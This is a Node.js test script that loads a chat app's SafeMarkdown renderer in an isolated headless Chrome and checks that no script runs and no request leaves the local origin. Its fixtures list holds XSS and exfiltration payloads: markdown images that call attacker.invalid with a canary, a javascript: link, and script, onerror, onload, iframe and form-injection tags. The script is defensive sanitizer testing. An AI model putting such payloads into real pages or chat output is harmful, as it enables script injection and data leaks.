// Optional real-browser gate. No app, login, model or email service is started.
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { mkdtemp, realpath, lstat, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import SafeMarkdown from "../src/components/chat/SafeMarkdown.js";

const MAX_REQUESTS = 20;
const MAX_MS = 15000;
const started = performance.now();
const fixtures = [
  "![external](https://attacker.invalid/collect?canary=synthetic)",
  "![external](//attacker.invalid/collect?canary=synthetic)",
  "![action](/forbidden-action)",
  "![data](data:image/svg+xml;base64,PHN2Zz4=)",
  "[javascript](javascript:globalThis.__aquaExecuted=1)",
  "[external](https://attacker.invalid)",
  "[mail](mailto:attacker@example.invalid)",
  '<script>globalThis.__aquaExecuted=1</script>',
  '<img src="https://attacker.invalid" onerror="globalThis.__aquaExecuted=1">',
  '<svg onload="globalThis.__aquaExecuted=1"></svg>',
  '<iframe src="https://attacker.invalid"></iframe>',
  '<form action="https://attacker.invalid"><input autofocus onfocus="globalThis.__aquaExecuted=1"></form>',
  '```html\n<script>globalThis.__aquaExecuted=1</script>\n```',
  "**Visible control**: ordinary answer text."
];
const html = "<!doctype html><meta charset=utf-8><title>AQUA synthetic content gate</title>" +
  renderToStaticMarkup(React.createElement("main", null, fixtures.map((text, index) =>
    React.createElement("section", { key: index, "data-fixture": index }, React.createElement(SafeMarkdown, null, text)))));

class PipeClient {
  constructor(child) {
    this.child = child;
    this.pending = new Map();
    this.sequence = 0;
    this.buffer = "";
    this.onEvent = () => {};
    child.stdio[4].on("data", (chunk) => {
      this.buffer += chunk.toString("utf8");
      let end;
      while ((end = this.buffer.indexOf("\0")) !== -1) {
        const text = this.buffer.slice(0, end);
        this.buffer = this.buffer.slice(end + 1);
        if (!text) continue;
        const message = JSON.parse(text);
        const task = this.pending.get(message.id);
        if (task) {
          clearTimeout(task.timer);
          this.pending.delete(message.id);
          if (message.error) task.reject(new Error("browser_protocol_failed"));
          else task.resolve(message.result);
        } else this.onEvent(message);
      }
    });
    child.once("error", () => this.fail());
    child.once("exit", () => this.fail());
  }
  fail() {
    for (const task of this.pending.values()) { clearTimeout(task.timer); task.reject(new Error("browser_closed")); }
    this.pending.clear();
  }
  send(method, params = {}, sessionId) {
    return new Promise((resolve, reject) => {
      const id = ++this.sequence;
      const timer = setTimeout(() => { this.pending.delete(id); reject(new Error("browser_deadline")); }, Math.max(1, Math.min(3000, MAX_MS - (performance.now() - started))));
      this.pending.set(id, { resolve, reject, timer });
      this.child.stdio[3].write(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }) + "\0");
    });
  }
}

let browser, cdp, profile, server;
let report;
let cleanup = false;
let closed;
const requests = [];
const intercepted = [];
const outside = [];
const unexpected = [];
const temporaryRoot = await realpath(tmpdir());
try {
  server = createServer((request, response) => {
    const item = new URL(request.url, "http://127.0.0.1");
    requests.push(item.pathname);
    if (requests.length > MAX_REQUESTS || performance.now() - started > MAX_MS) {
      response.writeHead(503); response.end(); return;
    }
    if (request.method === "GET" && item.pathname === "/") {
      response.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" });
      response.end(html);
    } else { response.writeHead(item.pathname === "/favicon.ico" ? 204 : 404); response.end(); }
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const origin = `http://127.0.0.1:${server.address().port}`;
  profile = await mkdtemp(path.join(temporaryRoot, "aqua-content-safety-"));
  const executable = process.env.AQUA_CHROME_EXECUTABLE || (process.platform === "win32" ? "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" : "/usr/bin/google-chrome");
  const env = Object.fromEntries(["SystemRoot", "WINDIR", "PATH", "TEMP", "TMP", "LOCALAPPDATA", "USERPROFILE", "APPDATA", "HOME"].filter((key) => process.env[key]).map((key) => [key, process.env[key]]));
  browser = spawn(executable, [
    "--headless=new", "--no-first-run", "--no-default-browser-check", "--disable-background-networking",
    "--disable-component-update", "--disable-sync", "--disable-extensions", "--disable-default-apps",
    "--disable-client-side-phishing-detection", "--no-pings", "--metrics-recording-only",
    "--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1",
    "--remote-debugging-pipe", `--user-data-dir=${profile}`, "about:blank"
  ], { windowsHide: true, stdio: ["ignore", "ignore", "ignore", "pipe", "pipe"], env });
  closed = new Promise((resolve) => browser.once("exit", resolve));
  cdp = new PipeClient(browser);
  const version = await cdp.send("Browser.getVersion");
  const targets = await cdp.send("Target.getTargets");
  const target = targets.targetInfos.find((item) => item.type === "page");
  assert.ok(target, "isolated browser page missing");
  const { sessionId } = await cdp.send("Target.attachToTarget", { targetId: target.targetId, flatten: true });
  let loaded;
  const load = new Promise((resolve) => { loaded = resolve; });
  cdp.onEvent = (event) => {
    if (event.sessionId !== sessionId) return;
    if (event.method === "Page.loadEventFired") loaded();
    if (event.method !== "Fetch.requestPaused") return;
    const { requestId, request } = event.params;
    const url = new URL(request.url);
    intercepted.push(url.pathname);
    const allowed = url.origin === origin && ["/", "/favicon.ico"].includes(url.pathname) && request.method === "GET" && intercepted.length <= MAX_REQUESTS;
    if (!allowed) {
      if (url.origin !== origin) outside.push(url.protocol + "//" + url.host);
      else unexpected.push(url.pathname);
    }
    void cdp.send(allowed ? "Fetch.continueRequest" : "Fetch.failRequest", allowed ? { requestId } : { requestId, errorReason: "BlockedByClient" }, sessionId).catch(() => {});
  };
  await cdp.send("Page.enable", {}, sessionId);
  await cdp.send("Network.enable", {}, sessionId);
  // Interception is acknowledged BEFORE navigation; no document request can
  // reach another origin or a real application route if a renderer regresses.
  await cdp.send("Fetch.enable", { patterns: [{ urlPattern: "*", requestStage: "Request" }] }, sessionId);
  await cdp.send("Page.addScriptToEvaluateOnNewDocument", { source: "globalThis.__aquaExecuted=0" }, sessionId);
  await cdp.send("Page.navigate", { url: origin + "/" }, sessionId);
  await Promise.race([load, new Promise((_, reject) => setTimeout(() => reject(new Error("page_load_deadline")), 3000))]);
  await new Promise((resolve) => setTimeout(resolve, 150));
  const inspected = await cdp.send("Runtime.evaluate", { returnByValue: true, expression: `({
    untouched:globalThis.__aquaExecuted===0,
    fixtures:document.querySelectorAll('[data-fixture]').length,
    active:document.querySelectorAll('img,iframe,object,embed,link,script,form,input,a[href],video,audio,source').length,
    handlers:[...document.querySelectorAll('*')].some(el=>[...el.attributes].some(attr=>/^on/i.test(attr.name))),
    control:document.body.textContent.includes('Visible control'),
    code:document.querySelector('pre code')?.textContent.includes('<script>')
  })` }, sessionId);
  const result = inspected.result.value;
  assert.deepEqual(result, { untouched: true, fixtures: fixtures.length, active: 0, handlers: false, control: true, code: true });
  assert.equal(outside.length, 0);
  assert.equal(unexpected.length, 0);
  assert.ok(intercepted.length > 0 && intercepted.length <= MAX_REQUESTS && requests.length <= MAX_REQUESTS);
  assert.ok(performance.now() - started < MAX_MS);
  report = { status: "passed", browser: version.product, mode: "isolated_real_browser", fixture_count: fixtures.length,
    max_requests: MAX_REQUESTS, max_seconds: MAX_MS / 1000, intercepted_requests: intercepted.length,
    external_attempts: outside.length, unexpected_loopback_actions: unexpected.length, assertions: result,
    limitations: "Synthetic renderer HTML only; no app session, Google, provider, email, spreadsheet or production browser journey. CSP is not claimed or used to mask renderer behavior." };
} finally {
  if (browser) {
    if (browser.exitCode === null) {
      await cdp?.send("Browser.close").catch(() => {});
      await Promise.race([closed, new Promise((resolve) => setTimeout(resolve, 1500))]);
    }
    if (browser.exitCode === null) { browser.kill(); await Promise.race([closed, new Promise((resolve) => setTimeout(resolve, 1000))]); }
  }
  cdp?.fail();
  server?.closeAllConnections();
  if (server?.listening) await new Promise((resolve) => server.close(resolve));
  if (profile) {
    const resolved = await realpath(profile);
    assert.equal(path.dirname(resolved), temporaryRoot);
    assert.ok(path.basename(resolved).startsWith("aqua-content-safety-"));
    assert.equal((await lstat(profile)).isSymbolicLink(), false);
    await rm(profile, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
  }
  cleanup = !browser || browser.exitCode !== null;
}
assert.ok(cleanup, "isolated browser did not exit");
console.log(JSON.stringify({ ...report, cleanup: "browser_stopped_server_closed_profile_removed", elapsed_seconds: Math.round((performance.now() - started) / 10) / 100 }));
